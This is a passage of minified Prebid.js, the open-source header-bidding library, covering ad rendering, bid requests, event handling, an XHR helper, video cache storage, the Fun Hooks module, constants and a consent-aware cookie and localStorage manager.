            if (Object(i.insertElement)(y, e, "html"), Object(p.c)(g)) Object(p.b)(g, r), J(y, e, "html"), Object(m.b)({
              doc: e,
              bid: r,
              id: t
            });else if (e === document && !Object(i.inIframe)() || "video" === l) {
              var v = "Error trying to write ad. Ad render call ad id ".concat(t, " was prevented from writing to the main document.");
              Object(m.a)({
                reason: k,
                message: v,
                bid: r,
                id: t
              });
            } else if (f) {
              if (navigator.userAgent && navigator.userAgent.toLowerCase().indexOf("firefox/") > -1) {
                var h = /firefox\/([\d\.]+)/,
                  O = navigator.userAgent.toLowerCase().match(h)[1];
                O && parseInt(O, 10) < 67 && e.open("text/html", "replace");
              }
              e.write(f), e.close(), G(e, d, s), J(y, e, "html"), Object(i.callBurl)(r), Object(m.b)({
                doc: e,
                bid: r,
                id: t
              });
            } else if (b) {
              var j = Object(i.createInvisibleIframe)();
              j.height = s, j.width = d, j.style.display = "inline", j.style.overflow = "hidden", j.src = b, Object(i.insertElement)(j, e, "body"), G(e, d, s), J(y, e, "html"), Object(i.callBurl)(r), Object(m.b)({
                doc: e,
                bid: r,
                id: t
              });
            } else {
              var E = "Error trying to write ad. No ad for bid response id: ".concat(t);
              Object(m.a)({
                reason: N,
                message: E,
                bid: r,
                id: t
              });
            }
          }
        } else {
          var S = "Error trying to write ad. Cannot find ad by given id : ".concat(t);
          Object(m.a)({
            reason: x,
            message: S,
            id: t
          });
        }
      } catch (e) {
        var I = "Error trying to write ad Id :".concat(t, " to the page:").concat(e.message);
        Object(m.a)({
          reason: P,
          message: I,
          id: t
        });
      } else {
        var C = "Error trying to write ad Id :".concat(t, " to the page. Missing document or adId");
        Object(m.a)({
          reason: q,
          message: C,
          id: t
        });
      }
    }), E.removeAdUnit = function (e) {
      (Object(i.logInfo)("Invoking pbjs.removeAdUnit", arguments), e) ? (Object(i.isArray)(e) ? e : [e]).forEach(function (e) {
        for (var t = E.adUnits.length - 1; t >= 0; t--) E.adUnits[t].code === e && E.adUnits.splice(t, 1);
      }) : E.adUnits = [];
    }, E.requestBids = Object(d.b)("async", function () {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        t = e.bidsBackHandler,
        n = e.timeout,
        r = e.adUnits,
        o = e.adUnitCodes,
        a = e.labels,
        d = e.auctionId;
      T.emit(_);
      var f = n || c.b.getConfig("bidderTimeout");
      r = r && c.b.convertAdUnitFpd(Object(i.isArray)(r) ? r : [r]) || E.adUnits, Object(i.logInfo)("Invoking pbjs.requestBids", arguments);
      var l = [],
        p = [];
      if (c.b.getConfig("s2sConfig", function (e) {
        e && e.s2sConfig && (l = Array.isArray(e.s2sConfig) ? e.s2sConfig : [e.s2sConfig]);
      }), l.forEach(function (e) {
        p.push.apply(p, h(e.bidders));
      }), r = K(r), o && o.length ? r = r.filter(function (e) {
        return b()(o, e.code);
      }) : o = r && r.map(function (e) {
        return e.code;
      }), r.forEach(function (e) {
        var t = Object.keys(e.mediaTypes || {
            banner: "banner"
          }),
          n = e.bids.map(function (e) {
            return e.bidder;
          }),
          r = S.bidderRegistry,
          o = p ? n.filter(function (e) {
            return !b()(p, e);
          }) : n;
        e.transactionId = Object(i.generateUUID)(), o.forEach(function (n) {
          var o = r[n],
            a = o && o.getSpec && o.getSpec(),
            c = a && a.supportedMediaTypes || ["banner"];
          t.some(function (e) {
            return b()(c, e);
          }) ? g.a.incrementBidderRequestsCounter(e.code, n) : (Object(i.logWarn)(Object(i.unsupportedBidderMessage)(e, n)), e.bids = e.bids.filter(function (e) {
            return e.bidder !== n;
          }));
        }), g.a.incrementRequestsCounter(e.code);
      }), r && 0 !== r.length) {
        var y = u.a.createAuction({
            adUnits: r,
            adUnitCodes: o,
            callback: t,
            cbTimeout: f,
            labels: a,
            auctionId: d
          }),
          v = r.length;
        v > 15 && Object(i.logInfo)("Current auction ".concat(y.getAuctionId(), " contains ").concat(v, " adUnits."), r), o.forEach(function (e) {
          return s.d.setLatestAuctionForAdUnit(e, y.getAuctionId());
        }), y.callBids();
      } else if (Object(i.logMessage)("No adUnits configured. No bids requested."), "function" == typeof t) try {
        t();
      } catch (e) {
        Object(i.logError)("Error executing bidsBackHandler", null, e);
      }
    }), E.requestBids.before(Q, 49), E.addAdUnits = function (e) {
      Object(i.logInfo)("Invoking pbjs.addAdUnits", arguments), E.adUnits.push.apply(E.adUnits, c.b.convertAdUnitFpd(Object(i.isArray)(e) ? e : [e])), T.emit(w);
    }, E.onEvent = function (e, t, n) {
      Object(i.logInfo)("Invoking pbjs.onEvent", arguments), Object(i.isFn)(t) ? !n || M[e].call(null, n) ? T.on(e, t, n) : Object(i.logError)('The id provided is not valid for event "' + e + '" and no handler was set.') : Object(i.logError)('The event handler provided is not a function and was not set on event "' + e + '".');
    }, E.offEvent = function (e, t, n) {
      Object(i.logInfo)("Invoking pbjs.offEvent", arguments), n && !M[e].call(null, n) || T.off(e, t, n);
    }, E.getEvents = function () {
      return Object(i.logInfo)("Invoking pbjs.getEvents"), T.getEvents();
    }, E.registerBidAdapter = function (e, t) {
      Object(i.logInfo)("Invoking pbjs.registerBidAdapter", arguments);
      try {
        S.registerBidAdapter(e(), t);
      } catch (e) {
        Object(i.logError)("Error registering bidder adapter : " + e.message);
      }
    }, E.registerAnalyticsAdapter = function (e) {
      Object(i.logInfo)("Invoking pbjs.registerAnalyticsAdapter", arguments);
      try {
        S.registerAnalyticsAdapter(e);
      } catch (e) {
        Object(i.logError)("Error registering analytics adapter : " + e.message);
      }
    }, E.createBid = function (e) {
      return Object(i.logInfo)("Invoking pbjs.createBid", arguments), Object(y.a)(e);
    };
    var $ = [],
      X = Object(d.b)("async", function (e) {
        e && !Object(i.isEmpty)(e) ? (Object(i.logInfo)("Invoking pbjs.enableAnalytics for: ", e), S.enableAnalytics(e)) : Object(i.logError)("pbjs.enableAnalytics should be called with option {}");
      }, "enableAnalyticsCb");
    function Z(e) {
      e.forEach(function (e) {
        if (void 0 === e.called) try {
          e.call(), e.called = !0;
        } catch (e) {
          Object(i.logError)("Error processing command :", "prebid.js", e);
        }
      });
    }
    E.enableAnalytics = function (e) {
      $.push(X.bind(this, e));
    }, E.aliasBidder = function (e, t, n) {
      Object(i.logInfo)("Invoking pbjs.aliasBidder", arguments), e && t ? S.aliasBidAdapter(e, t, n) : Object(i.logError)("bidderCode and alias must be passed as arguments", "pbjs.aliasBidder");
    }, E.getAllWinningBids = function () {
      return u.a.getAllWinningBids();
    }, E.getAllPrebidWinningBids = function () {
      return u.a.getBidsReceived().filter(function (e) {
        return e.status === A.BID_STATUS.BID_TARGETING_SET;
      });
    }, E.getHighestCpmBids = function (e) {
      return s.d.getWinningBids(e);
    }, E.markWinningBidAsUsed = function (e) {
      var t = [];
      e.adUnitCode && e.adId ? t = u.a.getBidsReceived().filter(function (t) {
        return t.adId === e.adId && t.adUnitCode === e.adUnitCode;
      }) : e.adUnitCode ? t = s.d.getWinningBids(e.adUnitCode) : e.adId ? t = u.a.getBidsReceived().filter(function (t) {
        return t.adId === e.adId;
      }) : Object(i.logWarn)("Improper use of markWinningBidAsUsed. It needs an adUnitCode or an adId to function."), t.length > 0 && (t[0].status = A.BID_STATUS.RENDERED);
    }, E.getConfig = c.b.getConfig, E.readConfig = c.b.readConfig, E.mergeConfig = c.b.mergeConfig, E.mergeBidderConfig = c.b.mergeBidderConfig, E.setConfig = c.b.setConfig, E.setBidderConfig = c.b.setBidderConfig, E.que.push(function () {
      return Object(o.a)();
    }), E.cmd.push = function (e) {
      if ("function" == typeof e) try {
        e.call();
      } catch (e) {
        Object(i.logError)("Error processing command :", e.message, e.stack);
      } else Object(i.logError)("Commands written into pbjs.cmd.push must be wrapped in a function");
    }, E.que.push = E.cmd.push, E.processQueue = function () {
      d.b.ready(), Z(E.que), Z(E.cmd);
    }, t.default = E;
  },
  38: function (e, t, n) {
    "use strict";

    t.a = function (e) {
      var t = e;
      return {
        callBids: function () {},
        setBidderCode: function (e) {
          t = e;
        },
        getBidderCode: function () {
          return t;
        }
      };
    };
  },
  39: function (e, t, n) {
    "use strict";

    t.a = function (e, t) {
      if (e.labelAll) return {
        labelAll: !0,
        labels: e.labelAll,
        activeLabels: t
      };
      return {
        labelAll: !1,
        labels: e.labelAny,
        activeLabels: t
      };
    }, t.c = function (e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : u,
        n = s(t);
      if (!n.shouldFilter) return !0;
      return !!n.sizesSupported[e];
    }, t.b = function () {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        t = e.labels,
        n = void 0 === t ? [] : t,
        r = e.labelAll,
        o = void 0 !== r && r,
        c = e.activeLabels,
        d = void 0 === c ? [] : c,
        f = arguments.length > 1 ? arguments[1] : void 0,
        l = arguments.length > 2 ? arguments[2] : void 0,
        b = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : u,
        g = s(b);
      f = Object(i.isPlainObject)(f) ? Object(i.deepClone)(f) : l ? {
        banner: {
          sizes: l
        }
      } : {};
      var p = Object(i.deepAccess)(f, "banner.sizes");
      g.shouldFilter && p && (f.banner.sizes = p.filter(function (e) {
        return g.sizesSupported[e];
      }));
      var y = Object.keys(f),
        v = {
          active: y.every(function (e) {
            return "banner" !== e;
          }) || y.some(function (e) {
            return "banner" === e;
          }) && Object(i.deepAccess)(f, "banner.sizes.length") > 0 && (0 === n.length || !o && (n.some(function (e) {
            return g.labels[e];
          }) || n.some(function (e) {
            return a()(d, e);
          })) || o && n.reduce(function (e, t) {
            return e ? g.labels[t] || a()(d, t) : e;
          }, !0)),
          mediaTypes: f
        };
      p && p.length !== f.banner.sizes.length && (v.filterResults = {
        before: p,
        after: f.banner.sizes
      });
      return v;
    };
    var r = n(3),
      i = n(0),
      o = n(12),
      a = n.n(o);
    function c(e) {
      return (c = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var u = [];
    function s(e) {
      return e.reduce(function (e, t) {
        if ("object" === c(t) && "string" == typeof t.mediaQuery && t.mediaQuery.length > 0) {
          var n = !1;
          try {
            n = Object(i.getWindowTop)().matchMedia(t.mediaQuery).matches;
          } catch (e) {
            Object(i.logWarn)("Unfriendly iFrame blocks sizeConfig from being correctly evaluated"), n = matchMedia(t.mediaQuery).matches;
          }
          n && (Array.isArray(t.sizesSupported) && (e.shouldFilter = !0), ["labels", "sizesSupported"].forEach(function (n) {
            return (t[n] || []).forEach(function (t) {
              return e[n][t] = !0;
            });
          }));
        } else Object(i.logWarn)('sizeConfig rule missing required property "mediaQuery"');
        return e;
      }, {
        labels: {},
        sizesSupported: {},
        shouldFilter: !1
      });
    }
    r.b.getConfig("sizeConfig", function (e) {
      return function (e) {
        u = e;
      }(e.sizeConfig);
    });
  },
  4: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return c;
    }), t.b = u;
    var r = n(3),
      i = n(0);
    function o() {
      return (o = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    function a(e) {
      return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var c = u();
    function u() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 3e3,
        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
        n = t.request,
        c = t.done;
      return function (t, u, s) {
        var d = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
        try {
          var f,
            l = d.method || (s ? "POST" : "GET"),
            b = document.createElement("a");
          b.href = t;
          var g = "object" === a(u) && null !== u ? u : {
            success: function () {
              Object(i.logMessage)("xhr success");
            },
            error: function (e) {
              Object(i.logError)("xhr error", null, e);
            }
          };
          if ("function" == typeof u && (g.success = u), (f = new window.XMLHttpRequest()).onreadystatechange = function () {
            if (4 === f.readyState) {
              "function" == typeof c && c(b.origin);
              var e = f.status;
              e >= 200 && e < 300 || 304 === e ? g.success(f.responseText, f) : g.error(f.statusText, f);
            }
          }, r.b.getConfig("disableAjaxTimeout") || (f.ontimeout = function () {
            Object(i.logError)("  xhr timeout after ", f.timeout, "ms");
          }), "GET" === l && s) {
            var p = Object(i.parseUrl)(t, d);
            o(p.search, s), t = Object(i.buildUrl)(p);
          }
          f.open(l, t, !0), r.b.getConfig("disableAjaxTimeout") || (f.timeout = e), d.withCredentials && (f.withCredentials = !0), Object(i._each)(d.customHeaders, function (e, t) {
            f.setRequestHeader(t, e);
          }), d.preflight && f.setRequestHeader("X-Requested-With", "XMLHttpRequest"), f.setRequestHeader("Content-Type", d.contentType || "text/plain"), "function" == typeof n && n(b.origin), "POST" === l && s ? f.send(s) : f.send();
        } catch (e) {
          Object(i.logError)("xhr construction", e), "object" === a(u) && null !== u && u.error(e);
        }
      };
    }
  },
  40: function (e, t, n) {
    "use strict";

    t.b = function (e, t, n) {
      var o = {
        puts: e.map(a, n)
      };
      Object(r.a)(i.b.getConfig("cache.url"), function (e) {
        return {
          success: function (t) {
            var n;
            try {
              n = JSON.parse(t).responses;
            } catch (t) {
              return void e(t, []);
            }
            n ? e(null, n) : e(new Error("The cache server didn't respond with a responses property."), []);
          },
          error: function (t, n) {
            e(new Error("Error storing video ad in the cache: ".concat(t, ": ").concat(JSON.stringify(n))), []);
          }
        };
      }(t), JSON.stringify(o), {
        contentType: "text/plain",
        withCredentials: !0
      });
    }, t.a = function (e) {
      return "".concat(i.b.getConfig("cache.url"), "?uuid=").concat(e);
    };
    var r = n(4),
      i = n(3),
      o = n(0);
    function a(e) {
      var t,
        n,
        r,
        a = {
          type: "xml",
          value: e.vastXml ? e.vastXml : (t = e.vastUrl, n = e.vastImpUrl, r = n ? "<![CDATA[".concat(n, "]]>") : "", '<VAST version="3.0">\n    <Ad>\n      <Wrapper>\n        <AdSystem>prebid.org wrapper</AdSystem>\n        <VASTAdTagURI><![CDATA['.concat(t, "]]></VASTAdTagURI>\n        <Impression>").concat(r, "</Impression>\n        <Creatives></Creatives>\n      </Wrapper>\n    </Ad>\n  </VAST>")),
          ttlseconds: Number(e.ttl)
        };
      return i.b.getConfig("cache.vasttrack") && (a.bidder = e.bidder, a.bidid = e.requestId, a.aid = e.auctionId, Object(o.isPlainObject)(this) && this.hasOwnProperty("auctionStart") && (a.timestamp = this.auctionStart)), "string" == typeof e.customCacheKey && "" !== e.customCacheKey && (a.key = e.customCacheKey), a;
    }
  },
  41: function (e, t, n) {
    "use strict";

    t.a = function (e) {
      var t = e.reason,
        n = e.message,
        i = e.bid,
        a = e.id,
        c = {
          reason: t,
          message: n
        };
      i && (c.bid = i);
      a && (c.adId = a);
      Object(r.logError)(n), o.a.emit(u, c);
    }, t.b = function (e) {
      var t = e.doc,
        n = e.bid,
        r = e.id,
        i = {
          doc: t
        };
      n && (i.bid = n);
      r && (i.adId = r);
      o.a.emit(s, i);
    };
    var r = n(0),
      i = n(10),
      o = n.n(i),
      a = n(5),
      c = n.n(a).a.EVENTS,
      u = c.AD_RENDER_FAILED,
      s = c.AD_RENDER_SUCCEEDED;
  },
  45: function (e, t) {
    e.exports = function e(t) {
      var n = Array.isArray(t) ? [] : {};
      for (var r in t) {
        var i = t[r];
        n[r] = i && "object" == typeof i ? e(i) : i;
      }
      return n;
    };
  },
  46: function (e, t, n) {
    "use strict";

    t.a = function (e, t, n, r, i) {
      for (t = t.split ? t.split(".") : t, r = 0; r < t.length; r++) e = e ? e[t[r]] : i;
      return e === i ? n : e;
    };
  },
  47: function (e, t, n) {
    "use strict";

    t.a = function (e, t, n) {
      t.split && (t = t.split("."));
      for (var r, i = 0, o = t.length, a = e; i < o; ++i) r = a[t[i]], a = a[t[i]] = i === o - 1 ? n : null != r ? r : !~t[i + 1].indexOf(".") && +t[i + 1] > -1 ? [] : {};
    };
  },
  48: function (e, t) {
    /*
    * @license MIT
    * Fun Hooks v0.9.10
    * (c) @snapwich
    */
    c.SYNC = 1, c.ASYNC = 2, c.QUEUE = 4;
    var n = Object.freeze({
        useProxy: !0,
        ready: 0
      }),
      r = new WeakMap(),
      i = "2,1,0" === [1].reduce(function (e, t, n) {
        return [e, t, n];
      }, 2).toString() ? Array.prototype.reduce : function (e, t) {
        var n,
          r = Object(this),
          i = r.length >>> 0,
          o = 0;
        if (t) n = t;else {
          for (; o < i && !(o in r);) o++;
          n = r[o++];
        }
        for (; o < i;) o in r && (n = e(n, r[o], o, r)), o++;
        return n;
      };
    function o(e, t) {
      return Array.prototype.slice.call(e, t);
    }
    var a = Object.assign || function (e) {
      return i.call(o(arguments, 1), function (e, t) {
        return t && Object.keys(t).forEach(function (n) {
          e[n] = t[n];
        }), e;
      }, e);
    };
    function c(e) {
      var t,
        u = {},
        s = [];
      function d(e, t) {
        return "function" == typeof e ? g.call(null, "sync", e, t) : "string" == typeof e && "function" == typeof t ? g.apply(null, arguments) : "object" == typeof e ? f.apply(null, arguments) : void 0;
      }
      function f(e, t, n) {
        var r = !0;
        void 0 === t && (t = Object.getOwnPropertyNames(e), r = !1);
        var i = {},
          o = ["constructor"];
        do {
          (t = t.filter(function (t) {
            return !("function" != typeof e[t] || -1 !== o.indexOf(t) || t.match(/^_/));
          })).forEach(function (t) {
            var r = t.split(":"),
              o = r[0],
              a = r[1] || "sync";
            if (!i[o]) {
              var c = e[o];
              i[o] = e[o] = g(a, c, n ? [n, o] : void 0);
            }
          }), e = Object.getPrototypeOf(e);
        } while (r && e);
        return i;
      }
      function l(e) {
        var n = Array.isArray(e) ? e : e.split(".");
        return i.call(n, function (r, i, o) {
          var a = r[i],
            c = !1;
          return a || (o === n.length - 1 ? (t || s.push(function () {
            c || console.warn("fun-hooks: referenced '" + e + "' but it was never created");
          }), r[i] = b(function (e) {
            r[i] = e, c = !0;
          })) : r[i] = {});
        }, u);
      }
      function b(e) {
        var t = [],
          n = [],
          i = function () {},
          o = {
            before: function (e, n) {
              return u.call(this, t, "before", e, n);
            },
            after: function (e, t) {
              return u.call(this, n, "after", e, t);
            },
            getHooks: function (e) {
              var r = t.concat(n);
              "object" == typeof e && (r = r.filter(function (t) {
                return Object.keys(e).every(function (n) {
                  return t[n] === e[n];
                });
              }));
              try {
                a(r, {
                  remove: function () {
                    return r.forEach(function (e) {
                      e.remove();
                    }), this;
                  }
                });
              } catch (e) {
                console.error("error adding `remove` to array, did you modify Array.prototype?");
              }
              return r;
            },
            removeAll: function () {
              return this.getHooks().remove();
            }
          },
          c = {
            install: function (r, o, a) {
              this.type = r, i = a, a(t, n), e && e(o);
            }
          };
        return r.set(o.after, c), o;
        function u(e, r, o, a) {
          var c = {
            hook: o,
            type: r,
            priority: a || 10,
            remove: function () {
              var r = e.indexOf(c);
              -1 !== r && (e.splice(r, 1), i(t, n));
            }
          };
          return e.push(c), e.sort(function (e, t) {
            return t.priority - e.priority;
          }), i(t, n), this;
        }
      }
      function g(n, i, u) {
        var d = i.after && r.get(i.after);
        if (d) {
          if (d.type !== n) throw "fun-hooks: recreated hookable with different type";
          return i;
        }
        var f,
          g,
          p = u ? l(u) : b(),
          y = {
            get: function (e, t) {
              return p[t] || Reflect.get.apply(Reflect, arguments);
            }
          };
        return t || s.push(v), e.useProxy && "function" == typeof Proxy && Proxy.revocable ? g = new Proxy(i, y) : a(g = function () {
          return y.apply ? y.apply(i, this, o(arguments)) : i.apply(this, arguments);
        }, p), r.get(g.after).install(n, g, function (e, t) {
          var r,
            i = [];
          e.length || t.length ? (e.forEach(a), r = i.push(void 0) - 1, t.forEach(a), f = function (e, t, a) {
            var c,
              u = 0,
              s = "async" === n && "function" == typeof a[a.length - 1] && a.pop();
            function d(e) {
              "sync" === n ? c = e : s && s.apply(null, arguments);
            }
            function f(e) {
              if (i[u]) {
                var r = o(arguments);
                return f.bail = d, r.unshift(f), i[u++].apply(t, r);
              }
              "sync" === n ? c = e : s && s.apply(null, arguments);
            }
            return i[r] = function () {
              var r = o(arguments, 1);
              "async" === n && s && (delete f.bail, r.push(f));
              var i = e.apply(t, r);
              "sync" === n && f(i);
            }, f.apply(null, a), c;
          }) : f = void 0;
          function a(e) {
            i.push(e.hook);
          }
          v();
        }), g;
        function v() {
          !t && ("sync" !== n || e.ready & c.SYNC) && ("async" !== n || e.ready & c.ASYNC) ? "sync" !== n && e.ready & c.QUEUE ? y.apply = function () {
            var e = arguments;
            s.push(function () {
              g.apply(e[1], e[2]);
            });
          } : y.apply = function () {
            throw "fun-hooks: hooked function not ready";
          } : y.apply = f;
        }
      }
      return (e = a({}, n, e)).ready ? d.ready = function () {
        t = !0, function (e) {
          for (var t; t = e.shift();) t();
        }(s);
      } : t = !0, d.get = l, d;
    }
    e.exports = c;
  },
  5: function (e, t) {
    e.exports = {
      JSON_MAPPING: {
        PL_CODE: "code",
        PL_SIZE: "sizes",
        PL_BIDS: "bids",
        BD_BIDDER: "bidder",
        BD_ID: "paramsd",
        BD_PL_ID: "placementId",
        ADSERVER_TARGETING: "adserverTargeting",
        BD_SETTING_STANDARD: "standard"
      },
      DEBUG_MODE: "pbjs_debug",
      STATUS: {
        GOOD: 1,
        NO_BID: 2
      },
      CB: {
        TYPE: {
          ALL_BIDS_BACK: "allRequestedBidsBack",
          AD_UNIT_BIDS_BACK: "adUnitBidsBack",
          BID_WON: "bidWon",
          REQUEST_BIDS: "requestBids"
        }
      },
      EVENTS: {
        AUCTION_INIT: "auctionInit",
        AUCTION_END: "auctionEnd",
        BID_ADJUSTMENT: "bidAdjustment",
        BID_TIMEOUT: "bidTimeout",
        BID_REQUESTED: "bidRequested",
        BID_RESPONSE: "bidResponse",
        NO_BID: "noBid",
        BID_WON: "bidWon",
        BIDDER_DONE: "bidderDone",
        BIDDER_ERROR: "bidderError",
        SET_TARGETING: "setTargeting",
        BEFORE_REQUEST_BIDS: "beforeRequestBids",
        BEFORE_BIDDER_HTTP: "beforeBidderHttp",
        REQUEST_BIDS: "requestBids",
        ADD_AD_UNITS: "addAdUnits",
        AD_RENDER_FAILED: "adRenderFailed",
        AD_RENDER_SUCCEEDED: "adRenderSucceeded",
        TCF2_ENFORCEMENT: "tcf2Enforcement",
        AUCTION_DEBUG: "auctionDebug",
        BID_VIEWABLE: "bidViewable",
        STALE_RENDER: "staleRender"
      },
      AD_RENDER_FAILED_REASON: {
        PREVENT_WRITING_ON_MAIN_DOCUMENT: "preventWritingOnMainDocument",
        NO_AD: "noAd",
        EXCEPTION: "exception",
        CANNOT_FIND_AD: "cannotFindAd",
        MISSING_DOC_OR_ADID: "missingDocOrAdid"
      },
      EVENT_ID_PATHS: {
        bidWon: "adUnitCode"
      },
      GRANULARITY_OPTIONS: {
        LOW: "low",
        MEDIUM: "medium",
        HIGH: "high",
        AUTO: "auto",
        DENSE: "dense",
        CUSTOM: "custom"
      },
      TARGETING_KEYS: {
        BIDDER: "hb_bidder",
        AD_ID: "hb_adid",
        PRICE_BUCKET: "hb_pb",
        SIZE: "hb_size",
        DEAL: "hb_deal",
        SOURCE: "hb_source",
        FORMAT: "hb_format",
        UUID: "hb_uuid",
        CACHE_ID: "hb_cache_id",
        CACHE_HOST: "hb_cache_host",
        ADOMAIN: "hb_adomain"
      },
      DEFAULT_TARGETING_KEYS: {
        BIDDER: "hb_bidder",
        AD_ID: "hb_adid",
        PRICE_BUCKET: "hb_pb",
        SIZE: "hb_size",
        DEAL: "hb_deal",
        FORMAT: "hb_format",
        UUID: "hb_uuid",
        CACHE_HOST: "hb_cache_host"
      },
      NATIVE_KEYS: {
        title: "hb_native_title",
        body: "hb_native_body",
        body2: "hb_native_body2",
        privacyLink: "hb_native_privacy",
        privacyIcon: "hb_native_privicon",
        sponsoredBy: "hb_native_brand",
        image: "hb_native_image",
        icon: "hb_native_icon",
        clickUrl: "hb_native_linkurl",
        displayUrl: "hb_native_displayurl",
        cta: "hb_native_cta",
        rating: "hb_native_rating",
        address: "hb_native_address",
        downloads: "hb_native_downloads",
        likes: "hb_native_likes",
        phone: "hb_native_phone",
        price: "hb_native_price",
        salePrice: "hb_native_saleprice",
        rendererUrl: "hb_renderer_url",
        adTemplate: "hb_adTemplate"
      },
      S2S: {
        SRC: "s2s",
        DEFAULT_ENDPOINT: "https://prebid.adnxs.com/pbs/v1/openrtb2/auction",
        SYNCED_BIDDERS_KEY: "pbjsSyncs"
      },
      BID_STATUS: {
        BID_TARGETING_SET: "targetingSet",
        RENDERED: "rendered",
        BID_REJECTED: "bidRejected"
      }
    };
  },
  7: function (e, t, n) {
    "use strict";

    n.d(t, "c", function () {
      return u;
    }), n.d(t, "d", function () {
      return d;
    }), t.a = function (e) {
      return s({
        moduleName: e,
        moduleType: "core"
      });
    }, t.b = function (e, t) {
      return s({
        gvlid: e,
        moduleName: t
      });
    };
    var r = n(8),
      i = n(0),
      o = n(12),
      a = n.n(o),
      c = ["core", "prebid-module"],
      u = [];
    function s() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        t = e.gvlid,
        n = e.moduleName,
        r = e.moduleType;
      function o(e) {
        if (a()(c, r)) {
          return e({
            valid: !0
          });
        }
        var o;
        return d(t, n, {
          hasEnforcementHook: !1
        }, function (t) {
          if (t && t.hasEnforcementHook) o = e(t);else {
            var n = {
              hasEnforcementHook: !1,
              valid: Object(i.hasDeviceAccess)()
            };
            o = e(n);
          }
        }), o;
      }
      var s = function (e, t, n, r, i, a) {
          var c = function (o) {
            if (o && o.valid) {
              var a = i && "" !== i ? " ;domain=".concat(encodeURIComponent(i)) : "",
                c = n && "" !== n ? " ;expires=".concat(n) : "",
                u = null != r && "none" == r.toLowerCase() ? "; Secure" : "";
              document.cookie = "".concat(e, "=").concat(encodeURIComponent(t)).concat(c, "; path=/").concat(a).concat(r ? "; SameSite=".concat(r) : "").concat(u);
            }
          };
          if (!a || "function" != typeof a) return o(c);
          u.push(function () {
            var e = o(c);
            a(e);
          });
        },
        f = function (e, t) {
          var n = function (t) {
            if (t && t.valid) {
              var n = window.document.cookie.match("(^|;)\\s*" + e + "\\s*=\\s*([^;]*)\\s*(;|$)");
              return n ? decodeURIComponent(n[2]) : null;
            }
            return null;
          };
          if (!t || "function" != typeof t) return o(n);
          u.push(function () {
            var e = o(n);
            t(e);
          });
        },
        l = function (e) {
          var t = function (e) {
            if (e && e.valid) try {
              return localStorage.setItem("prebid.cookieTest", "1"), "1" === localStorage.getItem("prebid.cookieTest");
            } catch (e) {} finally {
              try {
                localStorage.removeItem("prebid.cookieTest");
              } catch (e) {}
            }
            return !1;
          };
          if (!e || "function" != typeof e) return o(t);
          u.push(function () {
            var n = o(t);
            e(n);
          });
        },
        b = function (e) {
          var t = function (e) {
            return !(!e || !e.valid) && (!!Object(i.checkCookieSupport)() || (window.document.cookie = "prebid.cookieTest", -1 !== window.document.cookie.indexOf("prebid.cookieTest")));
          };
          if (!e || "function" != typeof e) return o(t);
          u.push(function () {
            var n = o(t);
            e(n);
          });
        },
        g = function (e, t, n) {
          var r = function (n) {
            n && n.valid && v() && window.localStorage.setItem(e, t);
          };
          if (!n || "function" != typeof n) return o(r);
          u.push(function () {
            var e = o(r);
            n(e);
          });
        },
        p = function (e, t) {
          var n = function (t) {
            return t && t.valid && v() ? window.localStorage.getItem(e) : null;
          };
          if (!t || "function" != typeof t) return o(n);
          u.push(function () {
            var e = o(n);
            t(e);
          });
        },
        y = function (e, t) {
          var n = function (t) {
            t && t.valid && v() && window.localStorage.removeItem(e);
          };
          if (!t || "function" != typeof t) return o(n);
          u.push(function () {
            var e = o(n);
            t(e);
          });
        },
        v = function (e) {
          var t = function (e) {
            if (e && e.valid) try {
              return !!window.localStorage;
            } catch (e) {
              Object(i.logError)("Local storage api disabled");
            }
            return !1;
          };
          if (!e || "function" != typeof e) return o(t);
          u.push(function () {
            var n = o(t);
            e(n);
          });
        },
        m = function (e, t) {
          var n = function (t) {
            if (t && t.valid) {
              var n = [];
              if (Object(i.hasDeviceAccess)()) for (var r = document.cookie.split(";"); r.length;) {
                var o = r.pop(),
                  a = o.indexOf("=");
                a = a < 0 ? o.length : a, decodeURIComponent(o.slice(0, a).replace(/^\s+/, "")).indexOf(e) >= 0 && n.push(decodeURIComponent(o.slice(a + 1)));
              }
              return n;
            }
          };
          if (!t || "function" != typeof t) return o(n);
          u.push(function () {
            var e = o(n);
            t(e);
          });
        };
      return {
        setCookie: s,
        getCookie: f,
        localStorageIsEnabled: l,
        cookiesAreEnabled: b,
        setDataInLocalStorage: g,
        getDataFromLocalStorage: p,
        removeDataFromLocalStorage: y,
        hasLocalStorage: v,
        findSimilarCookies: m
      };
    }
    var d = Object(r.b)("async", function (e, t, n, r) {
      r(n);
    }, "validateStorageEnforcement");
  },
  8: function (e, t, n) {
    "use strict";

    n.d(t, "b", function () {
      return c;
    }), n.d(t, "a", function () {
      return u;
    }), t.d = function (e, t) {
      var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 15,
        r = e.getHooks({
          hook: t
        });
      0 === r.length && e.before(t, n);
    }, t.c = function (e, t) {
      var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
        r = n.postInstallAllowed,
        i = void 0 !== r && r;
      c("async", function (n) {
        n.forEach(function (e) {
          return t.apply(void 0, o(e));
        }), i && (s[e] = t);
      }, e)([]);
    }, t.e = function (e) {
      for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
      var i = s[e];
